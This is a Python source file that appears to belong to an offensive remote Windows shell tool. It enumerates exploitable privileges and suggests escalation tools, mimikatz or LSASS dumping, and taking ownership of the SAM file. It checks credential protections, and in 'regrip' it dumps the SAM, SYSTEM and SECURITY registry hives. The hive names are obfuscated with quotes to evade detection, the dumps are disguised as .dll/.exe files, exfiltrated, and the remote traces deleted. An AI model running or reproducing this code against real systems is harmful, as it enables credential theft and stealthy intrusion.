#!/usr/bin/python3 
import os
import re
import logging
from termcolor import cprint

# ---- small helpers ----
def _clean(buf: str) -> str:
    # normalize newlines from CRLF to LF; don't strip interior spaces
    return (buf or "").replace("\r", "")

def _reg_dword_value(buf: str):
    """
    Parse lines like: '    UseLogonCredential    REG_DWORD    0x00000000 (0)'
    Returns an int or None.
    """
    m = re.search(r'REG_DWORD\s+0x([0-9a-fA-F]+)|REG_DWORD\s+(\d+)', buf)
    if not m:
        return None
    if m.group(1):
        return int(m.group(1), 16)
    return int(m.group(2))

def _has_priv(buf: str, name: str) -> bool:
    # whoami /priv output varies in spacing; match whole word
    return re.search(rf'\b{name}\b', buf, re.IGNORECASE) is not None

# ---- your commands using the helpers ----
def tokens(self, s):
    self.execute_remote(r'whoami /priv | findstr /i "Enabled"')
    buf = _clean(self.out)
    if buf.strip():
        if _has_priv(buf, "SeImpersonatePrivilege"):
            cprint('[*] SeImpersonatePrivilege Enabled:', 'green')
            print('\tJuicy-Potato\n\tRogueWinRM\n\tSweetPotato\n\tPrintSpoofer')
        if _has_priv(buf, "SeBackupPrivilege"):
            cprint('[*] SeBackupPrivilege Enabled:', 'green')
            print('\thttps://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1')
            print('\thttps://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug')
            print('\thttps://www.youtube.com/watch?v=IfCysW0Od8w&t=2610')
        if _has_priv(buf, "SeTakeOwnershipPrivilege"):
            cprint('[*] SeTakeOwnershipPrivilege Enabled:', 'green')
            print(r'\ttakeown /f "C:\Windows\System32\config\SAM"')
            print(r'\ticacls "C:\Windows\System32\config\SAM" /grant <your_username>:F')
        if _has_priv(buf, "SeDebugPrivilege"):
            cprint('[*] SeDebugPrivilege Enabled:', 'green')
            print('\tUse ProcDump on LSASS, or mimikatz (admin needed)')
    else:
        logging.info("No Valuable Tokens Found")
    self.out_clear()

def enum_credentials(self, s):
    # WDigest
    self.execute_remote(r'reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential')
    val = _reg_dword_value(_clean(self.out))
    if val in (None, 0):
        logging.info("WDigest is not enabled")
        self.out_clear()
    else:
        logging.info("WDigest might be enabled --> LSASS clear text creds")
        self.format_print_buff()  # prints + clears

    # LSA Protection
    self.execute_remote(r'reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL')
    val = _reg_dword_value(_clean(self.out))
    logging.info("LSA Protection Enabled" if val else "LSA Protection not enabled")
    self.out_clear()

    # Credential Guard
    self.execute_remote(r'reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v LsaCfgFlags')
    val = _reg_dword_value(_clean(self.out))
    if val == 0:
        logging.info("Credential Guard probably not enabled")
    elif val == 1:
        logging.info("Credential Guard active with UEFI lock")
    elif val == 2:
        logging.info("Credential Guard enabled without UEFI lock")
    else:
        logging.info("Couldnâ€™t determine Credential Guard state")
    self.out_clear()

    # Cached logons
    self.execute_remote(r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CACHEDLOGONSCOUNT')
    val = _reg_dword_value(_clean(self.out))
    if val == 10:
        logging.info("Default of 10 cached logons")
        self.out_clear()
    else:
        logging.info("Cached Logon Credential Amount")
        self.format_print_buff()


def regrip(self, s):
    try:
        logging.info("SAM")
        self.execute_remote(r'reg save "HK"L""M\s""a""m"" win32.dll')
        self.format_print_buff()
        logging.info("System")
        self.execute_remote(r'reg save "HK"L""M\s""ys""t"em" win32.exe')
        self.format_print_buff()
        logging.info("Security")
        self.execute_remote(r'reg save "HK"L""M\s""ec""u"rit"y"" update.exe')
        self.format_print_buff()
        self.do_lget("win32.dll")
        os.rename("win32.dll", "SAM")
        self.do_lget("win32.exe")
        os.rename("win32.exe", "System")
        self.do_lget("update.exe")
        os.rename("update.exe", "Security")
        self.execute_remote("del win32.dll")
        self.execute_remote("del win32.exe")
        self.execute_remote("del update.exe")
    except Exception as e:
        print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))